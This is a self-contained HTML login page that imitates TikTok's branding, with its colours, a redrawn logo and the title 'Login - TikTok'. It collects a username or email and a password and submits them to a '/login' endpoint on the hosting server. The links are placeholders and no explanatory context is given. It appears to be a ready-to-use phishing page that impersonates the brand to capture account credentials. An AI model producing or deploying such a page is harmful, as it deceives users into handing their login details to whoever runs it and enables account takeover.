<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #181818;
            padding: 40px;
            border-radius: 12px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 120px;
            height: auto;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: #aaa;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            background: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #fe2c55;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #fe2c55;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #e0254a;
        }
        .divider {
            text-align: center;
            margin: 20px 0;
            color: #666;
            font-size: 14px;
        }
        .divider span {
            background: #181818;
            padding: 0 12px;
        }
        .links {
            text-align: center;
            font-size: 14px;
            margin-top: 20px;
        }
        .links a {
            color: #fe2c55;
            text-decoration: none;
            margin: 0 10px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .error-msg {
            color: #fe2c55;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 200 50" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M40.5 16.8c-.4-.3-.9-.5-1.5-.5h-3.6v11.7c0 3.1-2.5 5.6-5.6 5.6-3.1 0-5.6-2.5-5.6-5.6 0-3.1 2.5-5.6 5.6-5.6.6 0 1.1.1 1.6.3v-4.4c-.5-.1-1.1-.1-1.6-.1-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10V16.8z" fill="#fe2c55"/>
                <path d="M44.5 9.4c-2.1 0-3.8-1.7-3.8-3.8s1.7-3.8 3.8-3.8 3.8 1.7 3.8 3.8-1.7 3.8-3.8 3.8z" fill="#fe2c55"/>
                <path d="M44.5 13.7h-3.6V33.4h3.6V13.7z" fill="#fe2c55"/>
                <path d="M55.5 13.7h-3.6v19.7h3.6V13.7z" fill="#fe2c55"/>
                <path d="M55.5 9.4h-3.6v4.3h3.6V9.4z" fill="#fe2c55"/>
                <path d="M68.5 30.9c-2.3 0-4.2-1.9-4.2-4.2V13.7h-3.6v13c0 4.3 3.5 7.8 7.8 7.8 2.4 0 4.6-1.1 6.1-2.8v-3.4c-1.3 1.4-3.2 2.4-5.3 2.4h-.8z" fill="#fff"/>
                <text x="80" y="30" font-family="-apple-system, BlinkMacSystemFont, sans-serif" font-size="24" font-weight="700" fill="#fff">TikTok</text>
            </svg>
        </div>
        <form id="loginForm" method="POST" action="/login">
            <div class="form-group">
                <label>Email or Username</label>
                <input type="text" name="username" placeholder="Enter your email or username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
            <div class="divider"><span>or</span></div>
            <div class="links">
                <a href="#">Forgot password?</a>
                <span style="color:#666;">|</span>
                <a href="#">Sign up for TikTok</a>
            </div>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Show loading state
            const btn = this.querySelector('.login-btn');
            btn.textContent = 'Logging in...';
            btn.disabled = true;
        });
    </script>
</body>
</html>
